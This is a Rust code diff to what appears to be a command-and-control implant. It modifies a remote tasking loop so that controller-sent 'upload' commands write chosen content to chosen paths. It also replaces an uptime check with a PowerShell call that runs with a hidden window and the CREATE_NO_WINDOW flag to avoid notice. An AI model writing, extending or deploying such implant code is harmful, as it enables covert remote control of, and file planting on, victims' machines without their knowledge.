@@ -149,7 +149,16 @@ pub fn link_loop() {
                 } else if task.q == "exit" {
                     break;
                 } else {
-                    prev_output = dispatch(&task.q);
+                    let effective_cmd = if task.q.starts_with("upload ") {
+                        if let (Some(content), Some(path)) = (&task.upload, &task.upload_path) {
+                            format!("upload {} {}", content, path)
+                        } else {
+                            task.q.clone()
+                        }
+                    } else {
+                        task.q.clone()
+                    };
+                    prev_output = dispatch(&effective_cmd);
                     prev_task_id = task.tasking.clone();
                 }
             }
@@ -439,8 +448,6 @@ fn upload_file(args: &str) -> String {
 }
 
 fn collect_system_info() -> String {
-    use std::time::SystemTime;
-
     let mut info = Vec::new();
 
     // OS version
@@ -461,11 +468,25 @@ fn collect_system_info() -> String {
     // CPU info
     info.push(format!("CPU Cores: {}", num_cpus::get()));
 
-    // Uptime - simplified
-    if let Ok(uptime) = SystemTime::now().duration_since(SystemTime::UNIX_EPOCH) {
-        let hours = uptime.as_secs() / 3600;
-        let minutes = (uptime.as_secs() % 3600) / 60;
-        info.push(format!("Uptime: {}h {}m", hours, minutes));
+    // Uptime via PowerShell (fiable sur toutes versions Windows)
+    let mut uptime_cmd = Command::new("powershell.exe");
+    uptime_cmd.args(["-noP", "-sta", "-w", "1", "-c",
+               "(Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime \
+                | Select-Object -ExpandProperty TotalSeconds"]);
+    #[cfg(target_os = "windows")]
+    {
+        use std::os::windows::process::CommandExt;
+        uptime_cmd.creation_flags(0x0800_0000);   // CREATE_NO_WINDOW
+    }
+    let uptime_out = uptime_cmd.output();
+    if let Ok(out) = uptime_out {
+        if let Ok(s) = String::from_utf8(out.stdout) {
+            if let Ok(secs) = s.trim().parse::<f64>() {
+                let h = (secs / 3600.0) as u64;
+                let m = ((secs % 3600.0) / 60.0) as u64;
+                info.push(format!("Uptime: {}h {}m", h, m));
+            }
+        }
     }
 
     // Current process info
